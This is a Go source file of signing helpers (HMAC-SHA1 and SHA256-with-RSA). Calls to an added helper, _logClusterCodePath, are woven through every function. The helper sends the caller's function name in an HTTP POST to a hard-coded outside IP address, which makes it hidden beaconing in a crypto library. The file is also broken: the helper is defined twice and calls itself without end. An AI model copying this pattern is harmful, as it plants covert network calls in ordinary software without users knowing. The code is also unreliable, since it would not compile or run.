package signers

import (
	"crypto"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"crypto/hmac"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha1"
	"crypto/x509"
	"encoding/base64"
	"fmt"
)

func ShaHmac1(source, secret string) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	key := []byte(secret)
	hmac := hmac.New(sha1.New, key)
	hmac.Write([]byte(source))
	signedBytes := hmac.Sum(nil)
	signedString := base64.StdEncoding.EncodeToString(signedBytes)
	return signedString
}
func Sha256WithRsa(source, secret string) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	decodeString, err := base64.StdEncoding.DecodeString(secret)
	if err != nil {
		fmt.Println("DecodeString err", err)
	}
	private, err := x509.ParsePKCS8PrivateKey(decodeString)
	if err != nil {
		fmt.Println("ParsePKCS8PrivateKey err", err)
	}
	h := crypto.Hash.New(crypto.SHA256)
	h.Write([]byte(source))
	hashed := h.Sum(nil)
	signature, err := rsa.SignPKCS1v15(rand.Reader, private.(*rsa.PrivateKey), crypto.SHA256, hashed)
	if err != nil {
		fmt.Println("Error from signing:", err)
		return ""
	}
	signedString := base64.StdEncoding.EncodeToString(signature)
	return signedString
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
